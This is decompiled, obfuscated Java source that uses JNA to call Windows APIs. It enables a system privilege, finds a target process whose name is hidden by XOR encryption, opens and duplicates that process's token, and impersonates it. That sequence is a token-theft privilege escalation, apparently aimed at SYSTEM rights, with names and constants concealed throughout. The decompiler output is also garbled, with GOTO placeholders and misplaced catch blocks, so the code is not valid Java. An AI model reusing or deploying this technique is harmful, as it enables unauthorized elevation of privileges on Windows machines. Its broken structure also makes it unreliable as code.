/*
 * Decompiled with CFR 0.152.
 */
package a.b.c.g;

import a.b.c.g.ab;
import a.b.c.g.g;
import a.b.c.g.u;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.Advapi32;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.ByteByReference;

class aa {
    private WinNT.HANDLE a;
    private WinNT.HANDLE b;
    private boolean c = false;
    private byte d;
    private static final String e;
    private static final long[] f;
    private static final Integer[] g;

    private aa() {
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Unable to fully structure code
     */
    public void start() throws Exception {
        block116: {
            block118: {
                block117: {
                    block109: {
                        block110: {
                            block108: {
                                block138: {
                                    block106: {
                                        block107: {
                                            block136: {
                                                block135: {
                                                    block104: {
                                                        block101: {
                                                            block100: {
                                                                block99: {
                                                                    block130: {
                                                                        block92: {
                                                                            block91: {
                                                                                block90: {
                                                                                    block119: {
                                                                                        block89: {
                                                                                            var2_1 = new ByteByReference();
                                                                                            var3_2 = ab.INSTANCE.RtlAdjustPrivilege(aa.a(4996, 6678392265477742122L), true, false, var2_1);
                                                                                            var1_3 = a.b.c.g.g.j();
                                                                                            if (var1_3) break block119;
                                                                                            try {
                                                                                                block120: {
                                                                                                    if (var3_2 == 0) break block89;
                                                                                                    break block120;
                                                                                                    catch (Exception v0) {
                                                                                                        throw aa.a(v0);
                                                                                                    }
                                                                                                }
                                                                                                throw new Exception();
                                                                                            }
                                                                                            catch (Exception v1) {
                                                                                                throw aa.a(v1);
                                                                                            }
                                                                                        }
                                                                                        this.c = true;
                                                                                        this.d = var2_1.getValue();
                                                                                    }
                                                                                    var4_4 = new Tlhelp32.PROCESSENTRY32.ByReference();
                                                                                    var5_5 = Kernel32.INSTANCE.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0L));
                                                                                    if (var1_3) break block90;
                                                                                    try {
                                                                                        block121: {
                                                                                            if (var5_5 != WinNT.INVALID_HANDLE_VALUE) break block91;
                                                                                            break block121;
                                                                                            catch (Exception v2) {
                                                                                                throw aa.a(v2);
                                                                                            }
                                                                                        }
                                                                                        this.a();
                                                                                    }
                                                                                    catch (Exception v3) {
                                                                                        throw aa.a(v3);
                                                                                    }
                                                                                }
                                                                                throw new Exception();
                                                                            }
                                                                            try {
                                                                                while (Kernel32.INSTANCE.Process32Next(var5_5, var4_4)) {
                                                                                    block94: {
                                                                                        block96: {
                                                                                            block97: {
                                                                                                block98: {
                                                                                                    block128: {
                                                                                                        block95: {
                                                                                                            block126: {
                                                                                                                block125: {
                                                                                                                    block124: {
                                                                                                                        block93: {
                                                                                                                            block122: {
                                                                                                                                var6_6 = Native.toString(var4_4.szExeFile);
                                                                                                                                v4 = aa.e.equalsIgnoreCase((String)var6_6);
                                                                                                                                if (var1_3) break block92;
                                                                                                                                if (var1_3) break block93;
                                                                                                                                break block122;
                                                                                                                                catch (Exception v5) {
                                                                                                                                    throw aa.a(v5);
                                                                                                                                }
                                                                                                                            }
                                                                                                                            try {
                                                                                                                                block123: {
                                                                                                                                    if (!v4) break block94;
                                                                                                                                    break block123;
                                                                                                                                    catch (Exception v6) {
                                                                                                                                        throw aa.a(v6);
                                                                                                                                    }
                                                                                                                                }
                                                                                                                                v7 = var4_4.th32ProcessID.intValue();
                                                                                                                            }
                                                                                                                            catch (Exception v8) {
                                                                                                                                throw aa.a(v8);
                                                                                                                            }
                                                                                                                        }
                                                                                                                        var7_7 = v7;
                                                                                                                        v9 = this.a = Kernel32.INSTANCE.OpenProcess(aa.a(29830, 7909416937518872877L), false, (int)var7_7);
                                                                                                                        if (var1_3) break block95;
                                                                                                                        if (v9 == null) ** GOTO lbl81
                                                                                                                        break block124;
                                                                                                                        catch (Exception v10) {
                                                                                                                            throw aa.a(v10);
                                                                                                                        }
                                                                                                                    }
                                                                                                                    v11 = this.a;
                                                                                                                    if (var1_3) break block96;
                                                                                                                    break block125;
                                                                                                                    catch (Exception v12) {
                                                                                                                        throw aa.a(v12);
                                                                                                                    }
                                                                                                                }
                                                                                                                if (v11 != WinNT.INVALID_HANDLE_VALUE) break block97;
                                                                                                                break block126;
                                                                                                                catch (Exception v13) {
                                                                                                                    throw aa.a(v13);
                                                                                                                }
                                                                                                            }
                                                                                                            try {
                                                                                                                block127: {
                                                                                                                    this.a = Kernel32.INSTANCE.OpenProcess(aa.a(4688, 5076300153933848568L), false, (int)var7_7);
                                                                                                                    v14 = this;
                                                                                                                    if (var1_3) break block98;
                                                                                                                    break block127;
                                                                                                                    catch (Exception v15) {
                                                                                                                        throw aa.a(v15);
                                                                                                                    }
                                                                                                                }
                                                                                                                v9 = v14.a;
                                                                                                            }
                                                                                                            catch (Exception v16) {
                                                                                                                throw aa.a(v16);
                                                                                                            }
                                                                                                        }
                                                                                                        if (v9 == null) ** GOTO lbl109
                                                                                                        v11 = this.a;
                                                                                                        if (var1_3) break block96;
                                                                                                        break block128;
                                                                                                        catch (Exception v17) {
                                                                                                            throw aa.a(v17);
                                                                                                        }
                                                                                                    }
                                                                                                    try {
                                                                                                        block129: {
                                                                                                            if (v11 != WinNT.INVALID_HANDLE_VALUE) break block97;
                                                                                                            break block129;
                                                                                                            catch (Exception v18) {
                                                                                                                throw aa.a(v18);
                                                                                                            }
                                                                                                        }
                                                                                                        v14 = this;
                                                                                                    }
                                                                                                    catch (Exception v19) {
                                                                                                        throw aa.a(v19);
                                                                                                    }
                                                                                                }
                                                                                                v14.a = null;
                                                                                            }
                                                                                            v11 = this.a;
                                                                                        }
                                                                                        if (v11 != null) break;
                                                                                    }
                                                                                    if (!var1_3) continue;
                                                                                }
                                                                                v4 = Kernel32.INSTANCE.CloseHandle(var5_5);
                                                                            }
                                                                            catch (Throwable var8_9) {
                                                                                Kernel32.INSTANCE.CloseHandle(var5_5);
                                                                                throw var8_9;
                                                                            }
                                                                        }
                                                                        v20 = this;
                                                                        if (var1_3) break block130;
                                                                        try {
                                                                            block131: {
                                                                                if (v20.a != null) break block99;
                                                                                break block131;
                                                                                catch (Exception v21) {
                                                                                    throw aa.a(v21);
                                                                                }
                                                                            }
                                                                            v20 = this;
                                                                        }
                                                                        catch (Exception v22) {
                                                                            throw aa.a(v22);
                                                                        }
                                                                    }
                                                                    v20.a();
                                                                    throw new Exception();
                                                                }
                                                                var6_6 = new WinNT.HANDLEByReference();
                                                                v23 = Advapi32.INSTANCE.OpenProcessToken(this.a, aa.a(6086, 8769852161689377391L), (WinNT.HANDLEByReference)var6_6);
                                                                if (var1_3) break block100;
                                                                try {
                                                                    block132: {
                                                                        if (v23) break block101;
                                                                        break block132;
                                                                        catch (Exception v24) {
                                                                            throw aa.a(v24);
                                                                        }
                                                                    }
                                                                    v23 = Kernel32.INSTANCE.CloseHandle(this.a);
                                                                }
                                                                catch (Exception v25) {
                                                                    throw aa.a(v25);
                                                                }
                                                            }
                                                            this.a = null;
                                                            this.a();
                                                            throw new Exception();
                                                        }
                                                        var7_8 = new WinNT.HANDLEByReference();
                                                        try {
                                                            block105: {
                                                                block102: {
                                                                    block103: {
                                                                        v26 = Advapi32.INSTANCE.DuplicateToken(var6_6.getValue(), 2, var7_8);
                                                                        if (var1_3) break block102;
                                                                        try {
                                                                            block133: {
                                                                                if (v26) break block103;
                                                                                break block133;
                                                                                catch (Exception v27) {
                                                                                    throw aa.a(v27);
                                                                                }
                                                                            }
                                                                            throw new Exception();
                                                                        }
                                                                        catch (Exception v28) {
                                                                            throw aa.a(v28);
                                                                        }
                                                                    }
                                                                    v26 = Advapi32.INSTANCE.ImpersonateLoggedOnUser(var7_8.getValue());
                                                                }
                                                                if (var1_3) break block104;
                                                                try {
                                                                    block134: {
                                                                        if (v26) break block105;
                                                                        break block134;
                                                                        catch (Exception v29) {
                                                                            throw aa.a(v29);
                                                                        }
                                                                    }
                                                                    Kernel32.INSTANCE.CloseHandle(var7_8.getValue());
                                                                    throw new Exception();
                                                                }
                                                                catch (Exception v30) {
                                                                    throw aa.a(v30);
                                                                }
                                                            }
                                                            this.b = var7_8.getValue();
                                                            v26 = Kernel32.INSTANCE.CloseHandle(var6_6.getValue());
                                                        }
                                                        catch (Throwable var9_10) {
                                                            block114: {
                                                                block115: {
                                                                    block113: {
                                                                        block111: {
                                                                            block112: {
                                                                                try {
                                                                                    try {
                                                                                        try {
                                                                                            try {
                                                                                                Kernel32.INSTANCE.CloseHandle(var6_6.getValue());
                                                                                                v31 = this.b;
                                                                                                if (var1_3) break block111;
                                                                                                if (v31 != null) break block112;
                                                                                            }
                                                                                            catch (Exception v32) {
                                                                                                throw aa.a(v32);
                                                                                            }
                                                                                            v31 = var7_8.getValue();
                                                                                            if (var1_3) break block111;
                                                                                        }
                                                                                        catch (Exception v33) {
                                                                                            throw aa.a(v33);
                                                                                        }
                                                                                        if (v31 == null) break block112;
                                                                                    }
                                                                                    catch (Exception v34) {
                                                                                        throw aa.a(v34);
                                                                                    }
                                                                                    Kernel32.INSTANCE.CloseHandle(var7_8.getValue());
                                                                                }
                                                                                catch (Exception v35) {
                                                                                    throw aa.a(v35);
                                                                                }
                                                                            }
                                                                            v31 = this.b;
                                                                        }
                                                                        try {
                                                                            try {
                                                                                try {
                                                                                    if (var1_3) break block113;
                                                                                    if (v31 != null) break block114;
                                                                                }
                                                                                catch (Exception v36) {
                                                                                    throw aa.a(v36);
                                                                                }
                                                                                v37 = this;
                                                                                if (var1_3) break block115;
                                                                            }
                                                                            catch (Exception v38) {
                                                                                throw aa.a(v38);
                                                                            }
                                                                            v31 = v37.a;
                                                                        }
                                                                        catch (Exception v39) {
                                                                            throw aa.a(v39);
                                                                        }
                                                                    }
                                                                    try {
                                                                        if (v31 != null) {
                                                                            Kernel32.INSTANCE.CloseHandle(this.a);
                                                                        }
                                                                    }
                                                                    catch (Exception v40) {
                                                                        throw aa.a(v40);
                                                                    }
                                                                    this.a = null;
                                                                    v37 = this;
                                                                }
                                                                v37.a();
                                                            }
                                                            throw var9_10;
                                                        }
                                                    }
                                                    v41 = this.b;
                                                    if (var1_3) break block106;
                                                    if (v41 != null) break block107;
                                                    break block135;
                                                    catch (Exception v42) {
                                                        throw aa.a(v42);
                                                    }
                                                }
                                                v41 = var7_8.getValue();
                                                if (var1_3) break block106;
                                                break block136;
                                                catch (Exception v43) {
                                                    throw aa.a(v43);
                                                }
                                            }
                                            try {
                                                block137: {
                                                    if (v41 == null) break block107;
                                                    break block137;
                                                    catch (Exception v44) {
                                                        throw aa.a(v44);
                                                    }
                                                }
                                                Kernel32.INSTANCE.CloseHandle(var7_8.getValue());
                                            }
                                            catch (Exception v45) {
                                                throw aa.a(v45);
                                            }
                                        }
                                        v41 = this.b;
                                    }
                                    if (var1_3) break block108;
                                    if (v41 != null) break block109;
                                    break block138;
                                    catch (Exception v46) {
                                        throw aa.a(v46);
                                    }
                                }
                                try {
                                    block139: {
                                        v47 = this;
                                        if (var1_3) break block110;
                                        break block139;
                                        catch (Exception v48) {
                                            throw aa.a(v48);
                                        }
                                    }
                                    v41 = v47.a;
                                }
                                catch (Exception v49) {
                                    throw aa.a(v49);
                                }
                            }
                            try {
                                if (v41 != null) {
                                    Kernel32.INSTANCE.CloseHandle(this.a);
                                }
                            }
                            catch (Exception v50) {
                                throw aa.a(v50);
                            }
                            this.a = null;
                            v47 = this;
                        }
                        v47.a();
                    }
                    try {
                        try {
                            if (a.b.c.f.u.b() != 0) break block116;
                            if (!var1_3) break block117;
                        }
                        catch (Exception v51) {
                            throw aa.a(v51);
                        }
                        v52 = false;
                        break block118;
                    }
                    catch (Exception v53) {
                        throw aa.a(v53);
                    }
                }
                v52 = true;
            }
            a.b.c.g.g.b(v52);
        }
    }

    private void a() {
        block4: {
            boolean bl;
            int n2;
            ab ab2;
            ByteByReference byteByReference;
            block2: {
                block3: {
                    boolean bl2 = a.b.c.g.g.i();
                    if (!this.c) break block4;
                    byteByReference = new ByteByReference();
                    try {
                        ab2 = ab.INSTANCE;
                        n2 = aa.a(10266, 2877142430827144624L);
                        bl = this.d;
                        if (!bl2) break block2;
                        if (!bl) break block3;
                    }
                    catch (RuntimeException runtimeException) {
                        throw aa.a(runtimeException);
                    }
                    bl = true;
                    break block2;
                }
                bl = false;
            }
            ab2.RtlAdjustPrivilege(n2, bl, false, byteByReference);
            this.c = false;
        }
    }

    public void close() {
        aa aa2;
        block11: {
            WinNT.HANDLE hANDLE;
            block9: {
                boolean bl;
                block10: {
                    boolean bl2 = a.b.c.g.g.j();
                    Advapi32.INSTANCE.RevertToSelf();
                    bl = bl2;
                    try {
                        try {
                            hANDLE = this.b;
                            if (bl) break block9;
                            if (hANDLE == null) break block10;
                        }
                        catch (RuntimeException runtimeException) {
                            throw aa.a(runtimeException);
                        }
                        Kernel32.INSTANCE.CloseHandle(this.b);
                        this.b = null;
                    }
                    catch (RuntimeException runtimeException) {
                        throw aa.a(runtimeException);
                    }
                }
                try {
                    aa2 = this;
                    if (bl) break block11;
                    hANDLE = aa2.a;
                }
                catch (RuntimeException runtimeException) {
                    throw aa.a(runtimeException);
                }
            }
            try {
                if (hANDLE != null) {
                    Kernel32.INSTANCE.CloseHandle(this.a);
                    this.a = null;
                }
            }
            catch (RuntimeException runtimeException) {
                throw aa.a(runtimeException);
            }
            aa2 = this;
        }
        aa2.a();
    }

    aa(u u2) {
        this();
    }

    private static Exception a(Exception exception) {
        return exception;
    }

    /*
     * Unable to fully structure code
     */
    static {
        block19: {
            block18: {
                block20: {
                    break block20;
lbl1:
                    // 1 sources

                    while (true) {
                        continue;
                        break;
                    }
                }
                v0 = "\\\u000fV\u001cn#7H\u0019".toCharArray();
                v1 = v0.length;
                var8 = 0;
                v2 = 10;
                v3 = v0;
                v4 = v1;
                if (v1 > 1) ** GOTO lbl54
                do {
                    v5 = v2;
                    v3 = v3;
                    v6 = v3;
                    v7 = v2;
                    v8 = var8;
                    while (true) {
                        switch (var8 % 7) {
                            case 0: {
                                v9 = 58;
                                break;
                            }
                            case 1: {
                                v9 = 118;
                                break;
                            }
                            case 2: {
                                v9 = 61;
                                break;
                            }
                            case 3: {
                                v9 = 101;
                                break;
                            }
                            case 4: {
                                v9 = 23;
                                break;
                            }
                            case 5: {
                                v9 = 7;
                                break;
                            }
                            default: {
                                v9 = 88;
                            }
                        }
                        v6[v8] = (char)(v6[v8] ^ (v7 ^ v9));
                        ++var8;
                        v2 = v5;
                        if (v5 != 0) break;
                        v5 = v2;
                        v3 = v3;
                        v8 = v2;
                        v6 = v3;
                        v7 = v2;
                    }
lbl54:
                    // 2 sources

                    v10 = v3;
                    v4 = v4;
                } while (v4 > var8);
                ** while (true)
                aa.e = new String(v10).intern();
                var0_1 = 4093630558211555965L;
                var6_2 = new long[5];
                var3_3 = 0;
                var4_4 = "V/\u008bY\u00b2E\u00a7\u00d9a\u0010\u0007\u00c5\u00c2\u00a7kPgU\u00abu\u0087\u009e\u0099\u0085";
                var5_5 = "V/\u008bY\u00b2E\u00a7\u00d9a\u0010\u0007\u00c5\u00c2\u00a7kPgU\u00abu\u0087\u009e\u0099\u0085".length();
                var2_6 = 0;
                while (true) {
                    var7_7 = var4_4.substring(var2_6, var2_6 += 8).getBytes("ISO-8859-1");
                    v11 = var6_2;
                    v12 = var3_3++;
                    v13 = ((long)var7_7[0] & 255L) << 56 | ((long)var7_7[1] & 255L) << 48 | ((long)var7_7[2] & 255L) << 40 | ((long)var7_7[3] & 255L) << 32 | ((long)var7_7[4] & 255L) << 24 | ((long)var7_7[5] & 255L) << 16 | ((long)var7_7[6] & 255L) << 8 | (long)var7_7[7] & 255L;
                    v14 = -1;
                    break block18;
                    break;
                }
lbl75:
                // 1 sources

                while (true) {
                    v11[v12] = v15;
                    if (var2_6 < var5_5) ** continue;
                    var4_4 = "\u0086D\u00a5\u00e91\u00cd\u0098\u0018\u0090\\\u0084\u00bd\u0001f\u001cC";
                    var5_5 = "\u0086D\u00a5\u00e91\u00cd\u0098\u0018\u0090\\\u0084\u00bd\u0001f\u001cC".length();
                    var2_6 = 0;
                    while (true) {
                        var7_7 = var4_4.substring(var2_6, var2_6 += 8).getBytes("ISO-8859-1");
                        v11 = var6_2;
                        v12 = var3_3++;
                        v13 = ((long)var7_7[0] & 255L) << 56 | ((long)var7_7[1] & 255L) << 48 | ((long)var7_7[2] & 255L) << 40 | ((long)var7_7[3] & 255L) << 32 | ((long)var7_7[4] & 255L) << 24 | ((long)var7_7[5] & 255L) << 16 | ((long)var7_7[6] & 255L) << 8 | (long)var7_7[7] & 255L;
                        v14 = 0;
                        break block18;
                        break;
                    }
                    break;
                }
lbl88:
                // 1 sources

                while (true) {
                    v11[v12] = v15;
                    if (var2_6 < var5_5) ** continue;
                    break block19;
                    break;
                }
            }
            v15 = v13 ^ var0_1;
            switch (v14) {
                default: {
                    ** continue;
                }
                ** case 0:
lbl99:
                // 1 sources

                ** continue;
            }
        }
        aa.f = var6_2;
        aa.g = new Integer[5];
    }

    private static int a(int n2, long l2) {
        int n3 = n2 ^ (int)(l2 & 0x7FFFL) ^ 0x4DAA;
        if (g[n3] == null) {
            aa.g[n3] = (int)(f[n3] ^ l2);
        }
        return g[n3];
    }
}

